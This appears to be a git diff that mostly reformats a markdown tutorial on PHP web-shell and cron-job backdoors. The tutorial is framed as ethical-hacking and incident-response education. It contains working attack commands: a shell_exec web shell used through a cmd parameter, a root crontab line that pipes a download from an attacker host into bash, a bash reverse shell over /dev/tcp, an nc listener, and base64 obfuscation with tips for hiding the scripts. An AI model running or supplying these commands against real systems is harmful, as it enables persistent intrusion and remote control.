@@ -34,27 +34,27 @@ A **PHP backdoor** is a small PHP script that allows an attacker to execute syst
 ```
 
 ## 🔧 How It Works:
+
 - This script checks for a cmd parameter in the request.
 
-- It uses ** shell_exec() ** to run any system command sent via the browser.
+- It uses **shell_exec()** to run any system command sent via the browser.
 
-- Output is displayed in ** <pre> ** tags for readability.
+- Output is displayed in **<pre>** tags for readability.
 
 ## 🌐 Usage:
 
-- If the file is saved as shell.php in  ` /var/www/html ` , an attacker can do:
+- If the file is saved as shell.php in  `/var/www/html` , an attacker can do:
 
-``bash
-Copy code
+```bash
 http://<target-ip>/shell.php?cmd=whoami
 ```
 ## Other useful examples:
 
-- ls – list files
+- `ls` – list files
 
-- cat /etc/passwd – read sensitive files
+- `cat /etc/passwd` – read sensitive files
 
-- nc – establish reverse shells
+- `nc` – establish reverse shells
 
 ## 🕵️ How Attackers Hide It:
 
@@ -73,7 +73,7 @@ http://<target-ip>/shell.php?cmd=whoami
 ```
 * * * * * root curl http://<attacker-ip>:8080/shell | bash
 ```
-This does the following:
+### This does the following:
 
 Runs every minute (* * * * *)
 
@@ -88,17 +88,14 @@ Pipes it into bash for execution
 - On the attacker’s server (hosted at port 8080), the shell file contains:
 
 ```bash
-
 #!/bin/bash
 bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
-
 ```
 ## 🛠️ Setup:
 
 Host the shell:
 
 ```bash
-
 python3 -m http.server 8080
 ```
 
@@ -119,18 +116,17 @@ nc -nvlp <port>
 
 ## 🕶️ Making It Sneakier
 
-- Attackers may:
+Attackers may:
 
-- Use user-level crontabs via crontab -e instead of global /etc/crontab
+- Use user-level crontabs via `crontab -e` instead of global `/etc/crontab`
 
 - Base64-encode the reverse shell to avoid detection:
 
 ```bash
-
 echo "<encoded_script>" | base64 -d | bash
 ```
 
-- Name scripts something innocuous like /update-check or /sys-patch
+- Name scripts something innocuous like  `/update-check` or `/sys-patch`
 
 ## 🧠 Final Thoughts
 - Both PHP and cron job backdoors are powerful tools in an attacker's toolkit. As an ethical hacker or security professional, understanding how these work is essential — both for offensive use (in labs/CTFs) and for detecting/removing them during incident response.
